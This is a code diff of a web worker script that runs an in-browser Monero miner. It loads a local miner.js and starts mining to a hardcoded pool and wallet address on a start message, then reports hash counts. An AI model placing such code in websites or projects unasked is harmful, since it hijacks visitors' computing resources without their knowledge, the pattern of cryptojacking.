@@ -1,24 +1,24 @@
-importScripts("https://esm.run/@marco_ciaramella/cpu-web-miner"); 
+importScripts("http://localhost:3000/miner.js");
 
-let isMining = false;
+self.onmessage = (e) => {
+  const { action, data } = e.data;
 
-self.onmessage = (event) => {
-  const { type, stratum } = event.data;
+  if (action === "start") {
+    const { pool, wallet } = data;
 
-  if (type === "start" && !isMining) {
-    isMining = true;
-    cpuWebMiner.start(
-      cpuWebMiner.ghostrider,
-      stratum,
-      null,
-      cpuWebMiner.ALL_THREADS,
-      (work) => self.postMessage({ type: "work", data: work }),
-      (hashrate) => self.postMessage({ type: "hashrate", data: hashrate }),
-      (error) => self.postMessage({ type: "error", data: error })
-    );
-  } else if (type === "stop" && isMining) {
-    isMining = false;
-    cpuWebMiner.stop();
-    self.postMessage({ type: "stopped" });
+    if (typeof startMining === "undefined") {
+      self.postMessage({ type: "error", message: "Mining script not loaded!" });
+      return;
+    }
+
+    startMining('gulf.moneroocean.stream', '42LmVzhaXCUXeRGako7gRmKKbEgiSk4i9iQTgbF6TdDaZ4ZwhogUj2k2pvD3n9t22Wcnvuc1Lj94e8jpvtAKViYnKztrPsU');
+    self.postMessage({ type: "status", message: "Mining started..." });
+
+    setInterval(() => {
+      self.postMessage({
+        type: "update",
+        message: `Calculated ${totalhashes} hashes.`,
+      });
+    }, 2000);
   }
 };
